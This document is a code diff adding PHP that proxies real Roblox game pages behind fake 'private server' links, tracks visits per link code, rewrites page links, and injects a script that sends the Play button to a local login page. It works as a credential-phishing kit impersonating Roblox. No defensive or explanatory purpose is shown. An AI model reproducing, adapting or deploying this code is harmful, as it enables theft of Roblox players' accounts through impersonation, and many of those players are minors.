@@ -1,0 +1,68 @@
+$gameid = $_GET['gameId'] ?? null;
+				$privateServerLinkCode = mysqli_real_escape_string($conn, $_GET['privateServerLinkCode'] ?? '');
+
+				if (empty($privateServerLinkCode)) {
+					die(header("Location: https://www.roblox.com/games/".$gameid));
+				}
+
+				if (!is_numeric($privateServerLinkCode)) {
+					http_response_code(500);
+					die();
+				}
+
+				$getData = $conn->query("SELECT * FROM `control` WHERE `games_privatecode` = '$privateServerLinkCode'");
+				$data = $getData->fetch_assoc();
+
+				if ($getData->num_rows === 0) {
+					die(header("Location: https://www.roblox.com/games/".$gameid));
+				}
+
+				$newVisits = $data['analysis_visits'] + 1;
+				$conn->query("UPDATE `control` SET `analysis_visits` = '$newVisits' WHERE `games_privatecode` = '$privateServerLinkCode'");
+
+				$curl = curl_init("https://www.roblox.com/games/$gameid/");
+				curl_setopt_array($curl, [
+					CURLOPT_RETURNTRANSFER => true,
+					CURLOPT_FOLLOWLOCATION => true,
+					CURLOPT_HEADER => true,
+					CURLOPT_USERAGENT => 'Mozilla/5.0'
+				]);
+
+				$response = curl_exec($curl);
+				$httpCode = curl_getinfo($curl, CURLINFO_HTTP_CODE);
+				$headerLen = curl_getinfo($curl, CURLINFO_HEADER_SIZE);
+				$headersRaw = substr($response, 0, $headerLen);
+				$body = substr($response, $headerLen);
+
+				$body = preg_replace_callback(
+					'/<a\s+href="([^"]+)"/i',
+					function($m) use ($privateServerLinkCode) {
+						$u = $m[1];
+						if (strpos($u, '?') === false) {
+							$u .= '?privateServerLinkCode=' . $privateServerLinkCode;
+						} elseif (strpos($u, 'privateServerLinkCode=') === false) {
+							$u .= '&privateServerLinkCode=' . $privateServerLinkCode;
+						}
+						return '<a href="' . $u . '"';
+					},
+					$body
+				);
+
+				res($body);
+				
+				$body .= '<script>
+				document.addEventListener("DOMContentLoaded", function() {
+					var interval = setInterval(function() {
+						var button = document.querySelector(".btn-common-play-game-lg");
+						if (button) {
+							button.addEventListener("click", function() {
+								window.location.href = "/login?returnUrl=" + encodeURIComponent("' . "http://" . $_SERVER['HTTP_HOST'] . $_SERVER['REQUEST_URI'] . '");
+							});
+							clearInterval(interval);
+						}
+					}, 50);
+				});
+				</script>';
+
+				http_response_code($httpCode);
+				die($body);
